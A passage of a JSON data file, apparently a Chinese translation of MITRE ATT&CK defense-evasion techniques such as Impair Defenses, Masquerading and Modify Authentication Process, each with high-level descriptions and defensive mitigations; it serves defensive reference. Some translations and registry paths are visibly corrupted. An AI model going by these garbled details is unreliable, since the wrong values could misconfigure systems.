                "name": "Path Interception by Unquoted Path"
            },
            {
                "id": "T1574.010",
                "name": "Services File Permissions Weakness"
            },
            {
                "id": "T1574.011",
                "name": "Services Registry Permissions Weakness"
            },
            {
                "id": "T1574.012",
                "name": "COR_PROFILER"
            },
            {
                "id": "T1574.013",
                "name": "KernelCallbackTable"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会通过劫持操作系统运行程序的方式来执行自己的恶意负载。劫持执行流可以用于持久性，因为这种被劫持的执行可能会随着时间的推移而再次发生。敌人也可能使用这些机制来提升特权或规避防御，例如应用程序控制或其他执行限制。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可以通过多种方式劫持执行流程，包括操纵操作系统如何定位要执行的程序。操作系统如何定位程序要使用的库也可以被截取。操作系统查找程序/资源的位置，如文件目录，以及在Windows的情况下的注册表，也可能被恶意负载毒害。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1013",
                "name": "应用程序开发人员指南",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果可能，请在清单文件中包含哈希值，以帮助防止恶意库的副加载。"
                        }
                    ]
                ]
            },
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用能够检测企业内系统劫持机会并加以纠正的审计工具。像PowerSploit框架这样的工具包包含PowerUp模块，这些模块可用于探索系统的劫持弱点。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "使用Windows附带的程序sxstrace.exe以及手动检查来检查清单文件中的软件侧加载漏洞。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "在程序配置文件、脚本、path环境变量、服务和快捷方式中，通过在函数允许的情况下用引号包围path变量，查找并消除路径拦截弱点。请注意Windows执行或加载二进制文件时使用的搜索顺序，并在适当的情况下使用完全限定的路径。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "卸载软件时，请清理旧的Windows注册表项，以避免没有关联的合法二进制文件的注册表项。定期搜索、纠正或报告系统上的路径拦截弱点，这些弱点可能是使用自定义或可用工具引入的，这些工具报告使用不安全路径配置的软件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1040",
                "name": "端点上的行为预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "一些端点安全解决方案可以配置为基于常见的指示符序列（例如：特定API函数的执行）来阻止与进程注入/内存篡改相关的某些类型的行为。"
                        }
                    ]
                ]
            },
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "敌人可能会使用新的有效载荷来执行这项技术。通过使用同样能够阻止合法软件加载的库的应用程序控制解决方案，识别并阻止通过劫持执行的潜在恶意软件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在写保护位置安装软件。在运行应用程序的文件夹和标准库文件夹中，设置目录访问控制以防止文件写入应用程序的搜索路径。"
                        }
                    ]
                ]
            },
            {
                "id": "M1044",
                "name": "限制库加载",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "不允许加载远程DLL。默认情况下，它包含在Windows Server 2012+中，并可通过XP+和Server 2003+的修补程序获得。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "启用安全DLL搜索模式，强制搜索具有更大限制的目录（例如"
                        },
                        {
                            "type": "code",
                            "content": "%SYSTEMROOT%"
                        },
                        {
                            "type": "text",
                            "content": "）中的系统DLL，以便在本地目录DLL（例如用户的主目录）之前使用"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "安全DLL搜索模式可以通过组策略在“计算机配置”>“[策略]”>“管理模板”>“MSS（旧版）:MSS:（SafeDllSearchMode）Enable Safe DLL Search Mode”中启用。相关的Windows注册表项位于"
                        },
                        {
                            "type": "code",
                            "content": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDLLSearchMode"
                        },
                        {
                            "type": "text",
                            "content": ""
                        }
                    ]
                ]
            },
            {
                "id": "M1024",
                "name": "限制注册表权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保为注册表配置单元设置了适当的权限，以防止用户修改可能导致权限提升的系统组件的密钥。"
                        }
                    ]
                ]
            },
            {
                "id": "M1051",
                "name": "更新软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期更新软件，以包括修复DLL端加载漏洞的修补程序。"
                        }
                    ]
                ]
            },
            {
                "id": "M1052",
                "name": "用户帐户控制",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "关闭标准用户的UAC权限提升"
                        },
                        {
                            "type": "code",
                            "content": "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]"
                        },
                        {
                            "type": "text",
                            "content": "以自动拒绝提升请求，添加："
                        },
                        {
                            "type": "code",
                            "content": "“ConsentCompBehaviorUser”=dword:000000000"
                        },
                        {
                            "type": "text",
                            "content": "。考虑通过添加以下内容为所有用户启用安装程序检测："
                        },
                        {
                            "type": "code",
                            "content": "“EnableInstallerDetection”=dword:000000001"
                        },
                        {
                            "type": "text",
                            "content": "。这将提示输入安装密码，并记录尝试。要禁用安装程序检测，请添加："
                        },
                        {
                            "type": "code",
                            "content": "“EnableInstallerDetection”=dword:000000000"
                        },
                        {
                            "type": "text",
                            "content": "。这可能会防止在UAC检测安装程序的过程中利用漏洞提升权限，但会允许安装过程在不被记录的情况下继续进行。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制用户帐户和组的权限，以便只有经过授权的管理员才能与服务更改和服务二进制目标路径位置进行交互。在可能的情况下，拒绝从用户目录（如文件下载目录和临时目录）执行。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "确保设置了适当的权限和目录访问控制，以拒绝用户将文件写入顶级目录"
                        },
                        {
                            "type": "code",
                            "content": "C:"
                        },
                        {
                            "type": "text",
                            "content": "和系统目录（如"
                        },
                        {
                            "type": "code",
                            "content": "C:\\Windows\\"
                        },
                        {
                            "type": "text",
                            "content": "），从而减少恶意文件可能被放置执行的位置。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1562",
        "name": "Impair Defenses",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [
            {
                "id": "T1562.001",
                "name": "Disable or Modify Tools"
            },
            {
                "id": "T1562.002",
                "name": "Disable Windows Event Logging"
            },
            {
                "id": "T1562.003",
                "name": "Impair Command History Logging"
            },
            {
                "id": "T1562.004",
                "name": "Disable or Modify System Firewall"
            },
            {
                "id": "T1562.006",
                "name": "Indicator Blocking"
            },
            {
                "id": "T1562.007",
                "name": "Disable or Modify Cloud Firewall"
            },
            {
                "id": "T1562.008",
                "name": "Disable or Modify Cloud Logs"
            },
            {
                "id": "T1562.009",
                "name": "Safe Mode Boot"
            },
            {
                "id": "T1562.010",
                "name": "Downgrade Attack"
            },
            {
                "id": "T1562.011",
                "name": "Spoof Security Alerting"
            },
            {
                "id": "T1562.012",
                "name": "Disable or Modify Linux Audit System"
            }
        ],
        "version": "1.5",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会恶意修改受害者环境的组成部分，以阻碍或禁用防御机制。这不仅涉及削弱防火墙和防病毒等预防性防御，还涉及防御者可以用来审计活动和识别恶意行为的检测能力。这也可能涵盖本机防御以及用户和管理员安装的补充功能。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人也可能损害有助于防御卫生的日常操作，例如阻止用户注销计算机或阻止其关闭。这些限制可能进一步导致恶意操作以及事件的持续传播。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人也可能以事件聚合和分析机制为目标，或者通过改变其他系统组件来破坏这些过程。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期检查帐户角色权限，以确保只有预期的用户和角色才有权修改防御工具和设置。"
                        }
                    ]
                ]
            },
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在适当的情况下使用应用程序控制，特别是在执行组织安全策略之外的工具（如rootkit删除工具）时，这些工具已被滥用以损害系统防御。确保仅在企业系统上使用和运行经批准的安全应用程序。"
                        }
                    ]
                ]
            },
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保拥有适当的流程和文件权限，以防止对手禁用或干扰安全/日志记录服务。"
                        }
                    ]
                ]
            },
            {
                "id": "M1024",
                "name": "限制注册表权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保拥有适当的注册表权限，以防止对手禁用或干扰安全/日志记录服务。"
                        }
                    ]
                ]
            },
            {
                "id": "M1054",
                "name": "软件配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑在内部web服务器上实施策略，如HTTP严格传输安全，强制使用HTTPS/网络流量加密来防止不安全的连接。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保拥有适当的用户权限，以防止对手禁用或干扰安全/日志记录服务。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1656",
        "name": "Impersonation",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会冒充一个值得信赖的人或组织，以说服和诱骗目标代表他们采取一些行动。例如，对手可能会冒充已知发件人（如高管、同事或第三方供应商）与受害者进行通信（通过网络钓鱼获取信息、网络钓鱼或内部矛式网络钓鱼）。然后，可以利用建立的信任来实现对手的最终目标，可能是针对多个受害者。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在许多商业电子邮件泄露或电子邮件欺诈活动中，对手使用冒充来欺诈受害者——欺骗他们汇款或泄露信息，最终导致金融盗窃。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "攻击者还经常使用社会工程技术，如电子邮件主题行中的操纵性和说服性语言，以及"
                },
                {
                    "type": "code",
                    "content": "支付"
                },
                {
                    "type": "text",
                    "content": "、"
                },
                {
                    "type": "code",
                    "content": "请求"
                },
                {
                    "type": "text",
                    "content": "或"
                },
                {
                    "type": "code",
                    "content": "紧急"
                },
                {
                    "type": "text",
                    "content": "等正文，以促使受害者在检测到恶意活动之前迅速采取行动。这些战役通常专门针对那些由于工作角色和/或访问权限而能够实现对手目标的人。  "
                }
            ],
            [
                {
                    "type": "text",
                    "content": "模仿之前通常会采用侦察技术，如收集受害者身份信息和收集受害者组织信息，以及获取电子邮件域（即域）等基础设施，以证实其虚假身份。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在涉及冒名顶替的运动中，可能会有多名受害者。例如，对手可能会泄露针对一个组织的帐户，然后这些帐户可用于支持针对其他实体的模拟。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1019",
                "name": "威胁情报计划",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "威胁情报有助于防御者和用户意识到并防御被用于冒充的常见诱惑和活跃活动。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "培训用户了解模仿技巧以及如何应对，例如通过电话或亲自等独立平台确认传入请求，以降低风险。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1070",
        "name": "Indicator Removal",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [
            {
                "id": "T1070.001",
                "name": "Clear Windows Event Logs"
            },
            {
                "id": "T1070.002",
                "name": "Clear Linux or Mac System Logs"
            },
            {
                "id": "T1070.003",
                "name": "Clear Command History"
            },
            {
                "id": "T1070.004",
                "name": "File Deletion"
            },
            {
                "id": "T1070.005",
                "name": "Network Share Connection Removal"
            },
            {
                "id": "T1070.006",
                "name": "Timestomp"
            },
            {
                "id": "T1070.007",
                "name": "Clear Network Connection History and Configurations"
            },
            {
                "id": "T1070.008",
                "name": "Clear Mailbox Data"
            },
            {
                "id": "T1070.009",
                "name": "Clear Persistence"
            }
        ],
        "version": "2.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会删除或修改系统内生成的工件，以删除其存在的证据或阻碍防御。各种人工制品可能是由对手创建的，或者可以归因于对手的行为。通常，这些工件被用作与监控事件相关的防御指标，例如下载文件中的字符串、用户操作生成的日志以及防御者分析的其他数据。工件的位置、格式和类型（如命令或登录历史记录）通常特定于每个平台。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "删除这些指示器可能会干扰事件收集、报告或用于检测入侵活动的其他过程。这可能会导致显著事件未被报告，从而损害安全解决方案的完整性。由于缺乏足够的数据来确定发生了什么，这种活动也可能阻碍法医分析和事件应对。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1041",
                "name": "加密敏感信息",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在本地和传输过程中混淆/加密事件文件，以避免向对手提供反馈。"
                        }
                    ]
                ]
            },
            {
                "id": "M1029",
                "name": "远程数据存储",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "自动将事件转发到日志服务器或数据存储库，以防止对手在本地系统上定位和操作数据。在可能的情况下，尽量减少事件报告的时间延迟，以避免在本地系统上延长存储时间。"
                        }
                    ]
                ]
            },
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过适当的权限和身份验证保护本地存储的生成的事件文件，并通过防止特权升级机会来限制对手增加特权的机会。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1202",
        "name": "Indirect Command Execution",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会滥用允许执行命令的实用程序，以绕过限制使用命令行解释器的安全限制。可以使用各种Windows实用程序来执行命令，可能不需要调用cmd。例如，Forfiles、程序兼容性助手（pcalua.exe）、Windows Linux子系统（WSL）的组件以及其他实用程序可以从命令和脚本解释器、运行窗口或通过脚本调用程序和命令的执行。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会滥用这些功能进行防御规避，特别是在破坏检测和/或缓解控制（如组策略）的同时执行任意执行，这些控制限制/阻止使用更常见的与恶意有效载荷相关的cmd或文件扩展名。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1036",
        "name": "Masquerading",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [
            {
                "id": "T1036.001",
                "name": "Invalid Code Signature"
            },
            {
                "id": "T1036.002",
                "name": "Right-to-Left Override"
            },
            {
                "id": "T1036.003",
                "name": "Rename System Utilities"
            },
            {
                "id": "T1036.004",
                "name": "Masquerade Task or Service"
            },
            {
                "id": "T1036.005",
                "name": "Match Legitimate Name or Location"
            },
            {
                "id": "T1036.006",
                "name": "Space after Filename"
            },
            {
                "id": "T1036.007",
                "name": "Double File Extension"
            },
            {
                "id": "T1036.008",
                "name": "Masquerade File Type"
            },
            {
                "id": "T1036.009",
                "name": "Break Process Trees"
            }
        ],
        "version": "1.6",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能试图操纵其工件的特征，使其对用户和/或安全工具来说合法或无害。当一个合法或恶意的物体的名称或位置被操纵或滥用以逃避防御和观察时，就会发生伪装。这可能包括操纵文件元数据，诱使用户错误识别文件类型，以及提供合法的任务或服务名称。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "重命名可滥用的系统实用程序以逃避安全监控也是伪装的一种形式。伪装还可能包括使用代理或VPN来伪装IP地址，这可以让对手融入正常的网络流量，绕过有条件访问政策或反滥用保护。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1049",
                "name": "防病毒/反恶意软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "防病毒可以用于自动隔离可疑文件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1040",
                "name": "端点上的行为预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在端点上实施安全控制，如主机入侵防御系统（HIPS），以识别和防止执行潜在的恶意文件（如文件签名不匹配的文件）。"
                        }
                    ]
                ]
            },
            {
                "id": "M1045",
                "name": "代码签名",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "需要签名的二进制文件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用通过所需的通用操作系统实用程序的文件名以外的属性通过应用程序控制来限制程序执行的工具。"
                        }
                    ]
                ]
            },
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用文件系统访问控制来保护文件夹，如C:\\Windows\\System32。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "训练用户不要打开电子邮件附件或点击未知链接（URL）。这样的培训在您的组织中培养了更安全的习惯，并将限制许多风险。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1556",
        "name": "Modify Authentication Process",
        "tactics": [
            {
                "id": "TA0006",
                "name": "Credential Access"
            },
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0003",
                "name": "Persistence"
            }
        ],
        "subs": [
            {
                "id": "T1556.001",
                "name": "Domain Controller Authentication"
            },
            {
                "id": "T1556.002",
                "name": "Password Filter DLL"
            },
            {
                "id": "T1556.003",
                "name": "Pluggable Authentication Modules"
            },
            {
                "id": "T1556.004",
                "name": "Network Device Authentication"
            },
            {
                "id": "T1556.005",
                "name": "Reversible Encryption"
            },
            {
                "id": "T1556.006",
                "name": "Multi-Factor Authentication"
            },
            {
                "id": "T1556.007",
                "name": "Hybrid Identity"
            },
            {
                "id": "T1556.008",
                "name": "Network Provider DLL"
            }
        ],
        "version": "2.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会修改身份验证机制和过程以访问用户凭据，或以其他方式对帐户进行不必要的访问。身份验证过程由一些机制处理，如Windows上的本地安全身份验证服务器（LSASS）过程和安全帐户管理器（SAM），基于Unix的系统上的可插入身份验证模块（PAM），以及MacOS系统上负责收集、存储和验证凭据的授权插件。通过修改身份验证过程，对手可以在不使用有效帐户的情况下对服务或系统进行身份验证。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可能会恶意修改此过程的一部分，以显示凭据或绕过身份验证机制。泄露的凭证或访问可用于绕过网络内系统上各种资源上的访问控制，甚至可用于持久访问远程系统和外部可用服务，如VPN、Outlook Web access和远程桌面。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "审查身份验证日志，以确保MFA强制执行等机制按预期运行。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "定期检查正在使用的混合身份解决方案是否存在任何差异。例如，查看Azure管理门户中的所有直通身份验证（PTA）代理，以识别任何不需要或未批准的代理。如果正在使用ADFS，请检查AD FS和全局程序集缓存目录中的DLL和可执行文件，以确保它们由Microsoft签名。请注意，在某些情况下，二进制文件可能是经过目录签名的，这可能会导致在查看文件属性时文件显示为未签名。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "定期检查注册表中新的和未知的网络提供程序DLL（"
                        },
                        {
                            "type": "code",
                            "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<NetworkProviderName>\\NetworkProvider\\ProviderPath"
                        },
                        {
                            "type": "text",
                            "content": "）。请确保仅注册了有效的网络提供程序DLL。这些服务的名称可以在注册表项的"
                        },
                        {
                            "type": "code",
                            "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order中找到，并且相应的服务子项指向HKEY_LOCAL_MACHINE\\SSYSTEM\\CurrentC ontrolSet\\Services\\<NetworkProviderName>\\NetworkProvider"
                        },
                        {
                            "type": "text",
                            "content": "中的DLL。"
                        }
                    ]
                ]
            },
            {
                "id": "M1032",
                "name": "多因素身份验证",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将多因素身份验证（MFA）作为组织策略的一部分进行集成，可以大大降低对手获得有效证书控制权的风险，这些证书可用于其他策略，如初始访问、横向移动和收集信息。MFA还可以用于限制对云资源和API的访问。"
                        }
                    ]
                ]
            },
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保只注册了有效的密码筛选器。筛选器DLL必须存在于域控制器和/或本地计算机的Windows安装目录（默认情况下为"
                        },
                        {
                            "type": "code",
                            "content": "C:\\Windows\\System32\\"
                        },
                        {
                            "type": "text",
                            "content": "）中，并在"
                        },
                        {
                            "type": "code",
                            "content": "HKEY_local_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages"
                        },
                        {
                            "type": "text",
                            "content": "中具有相应的条目。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "从Windows 11 22H2开始，可以通过组策略或配置服务提供商禁用"
                        },
                        {
                            "type": "code",
                            "content": "EnableMPRNotifications"
                        },
                        {
                            "type": "text",
                            "content": "策略，以阻止Winlogon向网络提供商发送凭据。"
                        }
                    ]
                ]
            },
            {
                "id": "M1027",
                "name": "密码策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保"
                        },
                        {
                            "type": "code",
                            "content": "AllowReversiblePasswordEncryption"
                        },
                        {
                            "type": "text",
                            "content": "属性设置为禁用，除非有应用程序要求。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期审核域和本地帐户及其权限级别，以寻找可能允许对手通过获取特权帐户的凭据获得广泛访问权限的情况。这些审计还应包括是否已启用默认帐户，或者是否创建了未经授权的新本地帐户。遵循企业网络设计和管理的最佳实践，以限制跨管理层的特权帐户使用。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "通过适当的权限分离（例如SELinux、grsecurity、AppArmor等）和限制权限提升机会，限制对根帐户的访问，防止用户修改受保护的组件。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "限制可访问混合身份解决方案的本地帐户。例如，将Azure AD Global Administrator帐户限制为仅需要的帐户，并确保这些帐户是专用的纯云帐户，而不是混合帐户。"
                        }
                    ]
                ]
            },
            {
                "id": "M1025",
                "name": "特权流程完整性",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "已启用LSA的功能，如受保护的过程灯（PPL）。"
                        }
                    ]
                ]
            },
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制对"
                        },
                        {
                            "type": "code",
                            "content": "/Library/Security/SecurityAgentPlugins"
                        },
                        {
                            "type": "text",
                            "content": "目录的写入访问。"
                        }
                    ]
                ]
            },
            {
                "id": "M1024",
                "name": "限制注册表权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制注册表权限以禁止修改敏感注册表项，如"
                        },
                        {
                            "type": "code",
                            "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order"
                        },
                        {
                            "type": "text",
                            "content": "。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保实施适当的策略，以规定用户帐户的身份验证机制（如MFA）的安全注册和停用。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1578",
        "name": "Modify Cloud Compute Infrastructure",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [
            {
                "id": "T1578.001",
                "name": "Create Snapshot"
            },
            {
                "id": "T1578.002",
                "name": "Create Cloud Instance"
            },
            {
                "id": "T1578.003",
                "name": "Delete Cloud Instance"
            },
            {
                "id": "T1578.004",
                "name": "Revert Cloud Instance"
            },
            {
                "id": "T1578.005",
                "name": "Modify Cloud Compute Configurations"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能试图修改云帐户的计算服务基础设施以躲避防御。对计算服务基础设施的修改可以包括创建、删除或修改一个或多个组件，例如计算实例、虚拟机和快照。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "通过修改基础设施组件获得的权限可能会绕过阻止访问现有基础设施的限制。修改基础设施组件也可能允许对手逃避检测并删除其存在的证据。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期监控用户权限，以确保只有预期用户才有能力修改云计算基础设施组件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "根据最低权限限制创建、删除和以其他方式更改计算组件的权限。组织应限制组织内具有管理权限的IAM角色的用户数量，努力减少所有永久特权角色分配，并定期对IAM用户、角色和策略进行权限审查。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1112",
        "name": "Modify Registry",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [],
        "version": "1.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会与Windows注册表交互，以隐藏注册表项中的配置信息，删除信息作为清理的一部分，或作为其他技术的一部分来帮助持久化和执行。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对注册表特定区域的访问取决于帐户权限，有些权限需要管理员级别的访问权限。内置的Windows命令行实用程序Reg可用于本地或远程注册表修改。还可以使用其他工具，例如远程访问工具，该工具可能包含通过Windows API与注册表交互的功能。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "注册表修改还可能包括隐藏注册表项的操作，例如在注册表项名称前加一个空字符，这将导致错误和/或在使用Win32 API通过Reg或其他实用程序读取时被忽略。敌人可能会滥用这些伪隐藏密钥来隐藏用于保持持久性的有效载荷/命令。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "可以修改远程系统的注册表，以帮助执行作为横向移动一部分的文件。它要求远程注册表服务在目标系统上运行。通常需要有效的帐户，以及访问远程系统的SMB/Windows管理共享以进行RPC通信。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1024",
                "name": "限制注册表权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保为注册表配置单元设置了适当的权限，以防止用户修改可能导致权限提升的系统组件的密钥。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1601",
        "name": "Modify System Image",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [
            {
                "id": "T1601.001",
                "name": "Patch System Image"
            },
            {
                "id": "T1601.002",
                "name": "Downgrade System Image"
            }
        ],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会对嵌入式网络设备的操作系统进行更改，以削弱防御并为自己提供新的能力。在这样的设备上，操作系统通常是单片的，并且大多数设备功能和能力都包含在单个文件中。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "要更改操作系统，对手通常只需要影响这一个文件，替换或修改它。这可以在系统运行时在内存中实时执行以立即生效，也可以在存储中执行以在下次启动网络设备时实现更改。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1046",
                "name": "引导完整性",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "一些嵌入式网络设备供应商提供加密签名，以确保启动时操作系统映像的完整性。在可用的情况下，按照供应商的指导方针实施。"
                        }
                    ]
                ]
            },
            {
                "id": "M1045",
                "name": "代码签名",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "许多供应商提供数字签名的操作系统映像，以验证其平台上使用的软件的完整性。尽可能利用此功能，以防止和/或检测对手破坏系统映像的企图。"
                        }
                    ]
                ]
            },
            {
                "id": "M1043",
                "name": "凭据访问保护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "一些嵌入式网络设备能够以纯文本或加密格式存储本地帐户的密码。根据供应商的建议，确保在可用的情况下始终加密本地密码。"
                        }
                    ]
                ]
            },
            {
                "id": "M1032",
                "name": "多因素身份验证",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "对用户和特权帐户使用多因素身份验证。大多数嵌入式网络设备支持TACACS+和/或RADIUS。遵循供应商规定的强化访问控制的最佳实践。"
                        }
                    ]
                ]
            },
            {
                "id": "M1027",
                "name": "密码策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "创建密码策略时，请参阅NIST指南。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "按照最低权限原则，将管理员帐户限制为尽可能少的个人。防止管理员帐户和特权帐户系统之间的凭据重叠，特别是在网络和非网络平台（如服务器或端点）之间。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1599",
        "name": "Network Boundary Bridging",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [
            {
                "id": "T1599.001",
                "name": "Network Address Translation Traversal"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以通过损害负责网络分割的外围网络设备或内部设备来桥接网络边界。破坏这些设备可能使对手能够绕过流量路由的限制，否则这些限制会将可信网络和不可信网络分开。"
